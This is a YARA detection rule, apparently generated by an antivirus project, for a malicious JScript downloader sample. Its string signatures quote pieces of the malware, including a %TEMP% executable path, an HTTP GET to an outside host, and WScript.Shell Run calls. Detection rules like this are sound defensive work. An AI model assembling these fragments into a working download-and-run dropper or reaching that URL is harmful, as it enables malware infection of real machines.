rule sig_20160328_c30db0f57e418384a0b5db5237a075b4 {
  meta:
    description = "datamaliciousorder - file 20160328_c30db0f57e418384a0b5db5237a075b4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e2a279b62280969a49c63d69fce607afca4fd7177793f319f20f894269278ce2"

  strings:
    $s1  = "function Garuxku() {return Uuttwqysi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"D0BLT57d8.exe\";};" fullword ascii
    $s2  = "Bbckitxvu[Tkeeqo](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Rwqxje](Jbbdkuwnwr() * 11)} while (Bbckitxvu[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Dwmrhr(Ojerhrp, Lcgijle){return Ojerhrp - Lcgijle;};" fullword ascii
    $s5  = "var Uuttwqysi = function Djvawz() {return WScript[Vshct](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Zlpfumfbqh(Eunhexyec){Uuttwqysi[\"Run\"](Eunhexyec, Ralvhimdxt, Ralvhimdxt);};" fullword ascii
    $s7  = "function Efroyjdae() {return ((Gjcjqde == true) && (Gjcjqde == Gjakuyt)) ? 1 : Ralvhimdxt;};" fullword ascii
    $s8  = "var Cxoeve = false;" fullword ascii
    $s9  = "function Ppghaidtbe()" fullword ascii
    $s10 = "var Fbtxv = new this[\"Date\"]();" fullword ascii
    $s11 = " while (Rjmuyooe){" fullword ascii
    $s12 = "function Jbbdkuwnwr(){return 22;};" fullword ascii
    $s13 = "var Gjakuyt = false;" fullword ascii
    $s14 = "var Gjcjqde = false;" fullword ascii
    $s15 = "Gjcjqde = true; " fullword ascii
    $s16 = "Gjakuyt = true; " fullword ascii
    $s17 = "function Mrhll(){return Vshct;};" fullword ascii
    $s18 = "function Xyzjunazwp(){return Fswrapapz;};" fullword ascii
    $s19 = "return Dwmrhr(Crmfi, Cmweohwfku);" fullword ascii
    $s20 = "function Pvahdxixx(Rhjqg) {var Ajadw = (1, 2, 3, 4, 5, Rhjqg); return Ajadw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}